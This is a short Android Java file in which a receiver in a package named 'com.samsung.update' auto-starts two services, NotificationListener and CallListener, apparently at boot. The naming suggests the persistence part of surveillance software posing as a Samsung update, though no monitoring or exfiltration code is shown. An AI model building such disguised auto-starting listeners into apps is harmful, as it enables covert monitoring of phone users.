package com.samsung.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class AutoStart extends BroadcastReceiver {
    public void onReceive(Context context, Intent arg1) {
        Intent intent;

        intent = new Intent(context, NotificationListener.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
        Log.e("Notification Autostart:", "started");

        intent = new Intent(context, CallListener.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
        Log.e("Call Autostart:", "started");
    }
}
